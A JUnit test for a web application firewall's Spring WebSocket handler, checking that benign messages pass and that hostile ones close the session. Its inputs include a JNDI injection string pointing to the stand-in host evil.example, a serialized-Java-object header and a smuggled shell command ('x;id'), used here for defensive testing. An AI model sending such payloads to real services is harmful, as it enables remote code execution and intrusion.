package com.aiwaf.spring;

import com.aiwaf.core.AiwafConfig;
import org.junit.jupiter.api.Test;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.TextWebSocketHandler;

import java.lang.reflect.Proxy;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;

class AiwafWebSocketHandlerTest {
    /** A session that records what it was closed with. */
    private static WebSocketSession session(CloseStatus[] closed) {
        return (WebSocketSession) Proxy.newProxyInstance(WebSocketSession.class.getClassLoader(), new Class<?>[] {WebSocketSession.class},
                (proxy, method, args) -> switch (method.getName()) {
                    case "getUri" -> URI.create("ws://localhost/chat?room=1");
                    case "close" -> {
                        closed[0] = args == null ? CloseStatus.NORMAL : (CloseStatus) args[0];
                        yield null;
                    }
                    case "isOpen" -> closed[0] == null;
                    case "getId" -> "s1";
                    default -> null;
                });
    }

    @Test
    void messagesReachTheHandlerUntilOneHasAFinding() throws Exception {
        List<Object> seen = new ArrayList<>();
        TextWebSocketHandler delegate = new TextWebSocketHandler() {
            @Override
            public void handleMessage(WebSocketSession session, WebSocketMessage<?> message) {
                seen.add(message.getPayload());
            }
        };
        AiwafConfig config = new AiwafConfig();
        AiwafWebSocketHandler handler = new AiwafWebSocketHandler(delegate, config);
        CloseStatus[] closed = {null};
        WebSocketSession session = session(closed);
        handler.handleMessage(session, new TextMessage("hello there"));
        assertNull(closed[0]);
        handler.handleMessage(session, new TextMessage("{\"q\": \"${jndi:ldap://evil.example/a}\"}"));
        assertEquals(1008, closed[0].getCode());
        assertEquals(List.of("hello there"), seen);
        closed[0] = null;
        handler.handleMessage(session, new BinaryMessage(new byte[] {(byte) 0xac, (byte) 0xed, 0, 5, 's', 'r'}));
        assertEquals(1008, closed[0].getCode());
        config.requestBodyInspectionBytes = 8;
        closed[0] = null;
        handler.handleMessage(session, new TextMessage("a".repeat(100)));
        assertEquals(1009, closed[0].getCode());
        config.sqlInjectionMode = "monitor";
        closed[0] = null;
        handler.handleMessage(session, new TextMessage("x;id"));
        assertNull(closed[0]);
        assertEquals("x;id", seen.get(seen.size() - 1));
    }
}
